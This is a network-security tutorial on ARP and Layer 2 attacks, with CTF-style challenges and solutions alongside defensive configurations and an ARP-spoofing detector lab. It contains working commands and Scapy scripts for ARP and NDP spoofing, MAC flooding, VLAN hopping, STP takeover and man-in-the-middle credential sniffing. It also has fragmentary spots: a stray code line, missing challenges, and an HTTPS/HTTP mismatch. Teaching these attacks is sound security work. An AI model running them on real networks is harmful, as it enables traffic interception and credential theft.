ARP & Layer 2 Attacks

ARP Protocol

ARP (Address Resolution Protocol) maps IPv4 addresses to MAC addresses on a local network segment. It operates at Layer 2 and is stateless — hosts accept ARP replies even without sending a request, which is the root of most ARP attacks.

How ARP Works

StepTypeDst MACDescription
1ARP Requestff:ff:ff:ff:ff:ff (broadcast)"Who has 192.168.1.1? Tell 192.168.1.100"
2ARP ReplyRequester's MAC (unicast)"192.168.1.1 is at aa:bb:cc:dd:ee:ff"
3Cache update—Requester stores mapping in ARP table

ARP Packet Structure

FieldSizeDescription
Hardware Type2 bytes1 = Ethernet
Protocol Type2 bytes0x0800 = IPv4
Hardware Size1 byte6 (MAC address length)
Protocol Size1 byte4 (IPv4 address length)
Opcode2 bytes1 = Request, 2 = Reply
Sender MAC6 bytesSource hardware address
Sender IP4 bytesSource protocol address
Target MAC6 bytesDestination hardware address
Target IP4 bytesDestination protocol address

ARP Table

# View ARP table
arp -a                          # all platforms
ip neigh show                   # Linux (modern)

# Add static entry
sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff
sudo ip neigh add 192.168.1.1 lladdr aa:bb:cc:dd:ee:ff dev eth0

# Delete entry
sudo arp -d 192.168.1.1
sudo ip neigh del 192.168.1.1 dev eth0

# Flush entire ARP cache
sudo ip neigh flush all

ARP Spoofing / Poisoning

Send fake ARP replies to associate your MAC address with another host's IP (usually the gateway). Victims send traffic to you instead of the real gateway, enabling MITM.

arpspoof (dsniff)

# Enable IP forwarding (so traffic still reaches its destination)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Poison victim's ARP cache — tell victim YOU are the gateway
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Poison gateway's ARP cache — tell gateway YOU are the victim
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Run both in separate terminals for full bidirectional MITM

Ettercap

# Text mode — ARP poisoning between target and gateway
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//

# GUI mode
sudo ettercap -G

# Scan for hosts on the network
sudo ettercap -T -q -i eth0 <<<'l'   # list hosts after scan

# With DNS spoofing plugin
sudo ettercap -T -q -i eth0 -M arp:remote -P dns_spoof /192.168.1.100// /192.168.1.1//

    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)

MAC Flooding

Overflows the switch's CAM (Content Addressable Memory) table with random MAC addresses. When the table is full, the switch falls back to hub mode — broadcasting all frames to all ports, allowing passive sniffing.

# macof (part of dsniff) — flood with random MAC addresses
sudo macof -i eth0

# Limit to specific count
sudo macof -i eth0 -n 100000
# Scapy MAC flood
from scapy.all import *

while True:
    packet = Ether(src=RandMAC(), dst=RandMAC()) / \
             IP(src=RandIP(), dst=RandIP()) / \
             ICMP()
    sendp(packet, iface="eth0", verbose=False)

VLAN Hopping

VLANs (802.1Q) segment Layer 2 traffic. VLAN hopping attacks let you reach hosts in VLANs you shouldn't have access to.

Switch Spoofing

Negotiate a trunk link with the switch by pretending to be another switch using DTP (Dynamic Trunking Protocol). Once trunked, you receive traffic from all VLANs.

# Yersinia — DTP attack to negotiate trunk
sudo yersinia dtp -attack 1 -interface eth0

# Verify trunk was established
sudo tcpdump -i eth0 -e | grep 802.1Q

Double Tagging

Encapsulate frames with two 802.1Q tags. The first tag (native VLAN) is stripped by the first switch, and the inner tag routes the frame to the target VLAN. One-way only — no return traffic.

# Scapy double-tagged frame
from scapy.all import *

# Outer tag = native VLAN (e.g., VLAN 1), Inner tag = target VLAN (e.g., VLAN 100)
frame = Ether(dst="ff:ff:ff:ff:ff:ff") / \
        Dot1Q(vlan=1) / \
        Dot1Q(vlan=100) / \
        IP(dst="192.168.100.1") / \
        ICMP()

sendp(frame, iface="eth0")

STP Attacks

Spanning Tree Protocol (STP) prevents Layer 2 loops by electing a root bridge. By injecting BPDUs with a lower bridge priority, you can become the root bridge and redirect all traffic through your machine.

# Yersinia — STP root bridge takeover
sudo yersinia stp -attack 4 -interface eth0

# STP DoS — flood with BPDUs to cause topology changes
sudo yersinia stp -attack 2 -interface eth0
# Scapy — send BPDU with lowest priority to become root
from scapy.all import *

bpdu = Dot3(dst="01:80:c2:00:00:00", src=get_if_hwaddr("eth0")) / \
       LLC(dsap=0x42, ssap=0x42, ctrl=3) / \
       STP(bpdutype=0x00, rootid=0, rootmac=get_if_hwaddr("eth0"),
           bridgeid=0, bridgemac=get_if_hwaddr("eth0"))

sendp(bpdu, iface="eth0", loop=1, inter=2)

Defense & Mitigation

Dynamic ARP Inspection (DAI)

Validates ARP packets against the DHCP snooping binding table. Drops ARP replies that don't match known IP-to-MAC mappings.

# Cisco IOS — enable DAI on a VLAN
ip arp inspection vlan 10,20

# Trust uplink ports (to other switches/routers)
interface GigabitEthernet0/1
  ip arp inspection trust

# Rate-limit ARP on untrusted ports (prevent DoS)
interface GigabitEthernet0/2
  ip arp inspection limit rate 15

Port Security

Limits the number of MAC addresses per switch port. Prevents MAC flooding and unauthorized device connections.

# Cisco IOS — enable port security
interface GigabitEthernet0/2
  switchport mode access
  switchport port-security
  switchport port-security maximum 2
  switchport port-security violation shutdown    # shutdown | restrict | protect
  switchport port-security mac-address sticky    # learn and lock MACs

Static ARP Entries

# Linux — add static entries for critical hosts (gateway, DNS)
sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff

# Windows
netsh interface ip add neighbors "Ethernet" 192.168.1.1 aa-bb-cc-dd-ee-ff

DHCP Snooping

# Cisco IOS — prerequisite for DAI
ip dhcp snooping
ip dhcp snooping vlan 10,20

interface GigabitEthernet0/1
  ip dhcp snooping trust      # uplink to DHCP server

Lab 7: Scapy ARP Monitor

Medium

Objective: Build a real-time ARP monitor that detects new hosts, ARP storms, and potential spoofing attacks on the network.

from scapy.all import *
from collections import defaultdict
import time

arp_table = {}
arp_counts = defaultdict(int)
STORM_THRESHOLD = 50  # packets per 10 seconds

def arp_monitor(pkt):
    if not pkt.haslayer(ARP):
        return

    src_ip = pkt[ARP].psrc
    src_mac = pkt[ARP].hwsrc
    op = "REQUEST" if pkt[ARP].op == 1 else "REPLY"

    # Track ARP rate (storm detection)
    arp_counts[src_mac] += 1

    # New host detection
    if src_ip not in arp_table:
        print(f"[NEW HOST] {src_ip} at {src_mac}")
        arp_table[src_ip] = src_mac
    elif arp_table[src_ip] != src_mac:
        print(f"[!!! SPOOF] {src_ip} MAC changed: "
              f"{arp_table[src_ip]} → {src_mac}")

    # Storm detection
    if arp_counts[src_mac] > STORM_THRESHOLD:
        print(f"[STORM] {src_mac} sent {arp_counts[src_mac]} ARP packets!")

print("[*] ARP Monitor running...")
sniff(filter="arp", prn=arp_monitor, store=0)

tshark -r suspicious_traffic.pcap -Y "arp.opcode == 2" \
  -T fields -e arp.src.hw_mac -e arp.src.proto_ipv4 | sort | uniq -c | sort -rn

Filter for arp.opcode == 2 (replies only). The attacker's MAC will appear claiming multiple IPs or the same IP as the legitimate gateway. Compare early ARP replies (before the attack) with later ones — the MAC address that changes for the gateway IP is the attacker. Wireshark's expert info may flag "duplicate IP address" automatically.

Challenge 2: MITM Credential Interception

Medium

You're on the same network as a target user who periodically logs into an HTTP service. Perform an ARP spoofing MITM attack and capture their credentials. The flag is the intercepted password.

# Network: 192.168.1.0/24
# Gateway: 192.168.1.1
# Target:  192.168.1.50 (logs into HTTP service on 192.168.1.200)
# You:     192.168.1.99

# Step 1: Enable forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Step 2: ARP spoof (pick your tool)
sudo arpspoof -i eth0 -t 192.168.1.50 192.168.1.1 &
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.50 &

# Step 3: Capture and filter for credentials
sudo tcpdump -i eth0 -A -s 0 'host 192.168.1.50 and port 80' | grep -i -E 'user|pass|login'

# OR use dsniff for automatic credential extraction
sudo dsniff -i eth0

# OR capture pcap and analyze in Wireshark
sudo tcpdump -i eth0 -w creds.pcap host 192.168.1.50
# Then: Wireshark → filter: http.request.method == POST → Follow HTTP Stream

# Flag format: FLAG{captured_password}

Make sure IP forwarding is enabled or the victim loses connectivity (which tips them off). Use dsniff for easy credential sniffing or capture a pcap and search for POST requests containing form data. In Wireshark, use the filter http.request.method == "POST" and follow the HTTP stream to see the submitted username and password in cleartext.

Challenge 3: ARP Anomaly Hunter

Medium

A pcap contains normal network traffic mixed with an ARP-based reconnaissance scan. Identify how many unique hosts the attacker discovered and the attacker's MAC address.

from scapy.all import *
from collections import Counter

pkts = rdpcap("recon.pcap")

# Find the MAC sending the most ARP requests
arp_requests = [p for p in pkts if p.haslayer(ARP) and p[ARP].op == 1]
mac_counts = Counter(p[ARP].hwsrc for p in arp_requests)
attacker_mac = mac_counts.most_common(1)[0][0]

# Count unique hosts discovered (replies to attacker)
arp_replies = [p for p in pkts if p.haslayer(ARP) and p[ARP].op == 2
               and p[ARP].hwdst == attacker_mac]
discovered = set(p[ARP].psrc for p in arp_replies)

print(f"Attacker MAC: {attacker_mac}")
print(f"Hosts discovered: {len(discovered)}")
# Flag: FLAG{attacker_mac_count}

The attacker sends ARP requests to sequential IPs (subnet scan). Count the unique source MAC sending the most ARP requests — that's the scanner. Then count unique ARP replies directed back to that MAC.

Challenge 6: Passive Network Discovery

Easy

Without sending any packets, passively monitor ARP traffic for 5 minutes to build a complete map of the network. Identify all hosts, the gateway, and any DHCP servers. The flag is the gateway's MAC.

from scapy.all import *
from collections import defaultdict

hosts = {}
gateway_candidates = defaultdict(int)

def passive_monitor(pkt):
    if pkt.haslayer(ARP):
        ip = pkt[ARP].psrc
        mac = pkt[ARP].hwsrc
        hosts[ip] = mac

        # Gateway is the most frequently queried target
        if pkt[ARP].op == 1:  # request
            gateway_candidates[pkt[ARP].pdst] += 1

pkts = sniff(filter="arp", timeout=300, prn=passive_monitor)

print("=== Network Map ===")
for ip, mac in sorted(hosts.items()):
    print(f"  {ip:15s} → {mac}")

gw = max(gateway_candidates, key=gateway_candidates.get)
print(f"\n[+] Likely gateway: {gw} (MAC: {hosts.get(gw, 'unknown')})")
# Flag: FLAG{gateway_mac}

Don't send any packets — just listen. The gateway IP is the one most frequently seen as the target of ARP requests (since all hosts need to resolve it). Its MAC appears in ARP replies.

Challenge 7: ARP Race Condition

Hard

A security appliance monitors ARP and blocks spoofing attempts, but it has a race condition: if you send a valid ARP request followed by a spoofed reply within 5ms, the reply is accepted. Exploit this to MITM the connection and intercept the flag.

from scapy.all import *
import time

victim = "192.168.1.100"
gateway = "192.168.1.1"
my_mac = get_if_hwaddr("eth0")

# Send legitimate ARP request immediately followed by spoofed reply
# The IDS checks the request, creating a brief window

while True:
    # Legitimate request (makes IDS think normal traffic)
    req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=gateway)
    # Spoofed reply (must arrive within 5ms of request)
    spoof = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2, psrc=gateway, hwsrc=my_mac,
        pdst=victim, hwdst="ff:ff:ff:ff:ff:ff")

    sendp([req, spoof], iface="eth0", verbose=0, inter=0.001)
    time.sleep(2)

The key is timing. Send the request and reply as a batch with near-zero interval (inter=0.001). The IDS processes the request and whitelists the reply source for a brief window. Don't forget to enable IP forwarding before intercepting.

Challenge 8: Dual-Stack ARP/NDP Attack

Hard

A network runs dual-stack (IPv4 + IPv6). ARP spoofing is blocked by DAI, but NDP (Neighbor Discovery Protocol) for IPv6 has no equivalent protection. Use NDP spoofing to MITM the IPv6 traffic and capture the flag from an HTTPS connection.

from scapy.all import *

victim_ipv6 = "fe80::1"
gateway_ipv6 = "fe80::ffff"
my_mac = get_if_hwaddr("eth0")

# IPv6 Neighbor Advertisement (equivalent of ARP reply)
# Tell victim: gateway's link-local is at our MAC
na = Ether(dst="33:33:00:00:00:01") / \
     IPv6(src=gateway_ipv6, dst="ff02::1") / \
     ICMPv6ND_NA(tgt=gateway_ipv6, R=1, S=0, O=1) / \
     ICMPv6NDOptDstLLAddr(lladdr=my_mac)

print("[*] Sending NDP spoofing packets...")
sendp(na, iface="eth0", loop=1, inter=2)
# Enable IPv6 forwarding
sudo sysctl -w net.ipv6.conf.all.forwarding=1

# Capture IPv6 traffic
sudo tcpdump -i eth0 ip6 -w ndp_mitm.pcap

DAI only protects IPv4 ARP. IPv6 uses NDP which most networks don't protect with RA Guard or similar. Spoof Neighbor Advertisements targeting the gateway's link-local address. Capture the IPv6 traffic — the flag is in an HTTP (not HTTPS) request over IPv6.

Challenge 9: Network Sniffing Setup

Easy

Set up a network sniffer on a switched network. Since switches don't broadcast unicast traffic, use ARP spoofing to capture traffic between two hosts. Extract the flag from an FTP session.

# Enable forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# ARP spoof both directions
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.200 &
sudo arpspoof -i eth0 -t 192.168.1.200 192.168.1.100 &

# Capture FTP traffic
sudo tcpdump -i eth0 -A 'port 21' -w ftp_capture.pcap

# Extract credentials
tshark -r ftp_capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" \
  -T fields -e ftp.request.arg

FTP credentials are transmitted in plaintext. Spoof both directions (victim↔server) so you see both sides. Filter for FTP USER and PASS commands. The password is the flag.

Challenge 10: ARP Table Forensics

Medium

A forensic image contains the ARP table from a compromised host. Analyze it to identify: which host was the attacker, which host was being impersonated, and the attacker's real IP. The flag combines all three.

# Extracted ARP table from forensic image:
# IP               MAC                 Type
# 192.168.1.1      aa:bb:cc:11:22:33   dynamic    <-- gateway
# 192.168.1.50     aa:bb:cc:11:22:33   dynamic    <-- same MAC as gateway!
# 192.168.1.100    de:ad:be:ef:00:01   dynamic
# 192.168.1.150    de:ad:be:ef:00:02   dynamic

# The duplicate MAC reveals the attack:
# 192.168.1.50 has the SAME MAC as 192.168.1.1 (gateway)
# This means 192.168.1.50 was ARP-spoofing the gateway
# Attacker: 192.168.1.50
# Impersonated: 192.168.1.1

# Verify: check if the MAC actually belongs to 192.168.1.50
# Look up vendor OUI: aa:bb:cc → some vendor
# Flag: FLAG{192.168.1.50_192.168.1.1_aa:bb:cc:11:22:33}

Look for two different IPs sharing the same MAC address. The non-gateway IP with the gateway's MAC is the attacker. The gateway IP is being impersonated. Cross-reference with the DHCP logs to find the attacker's real MAC.
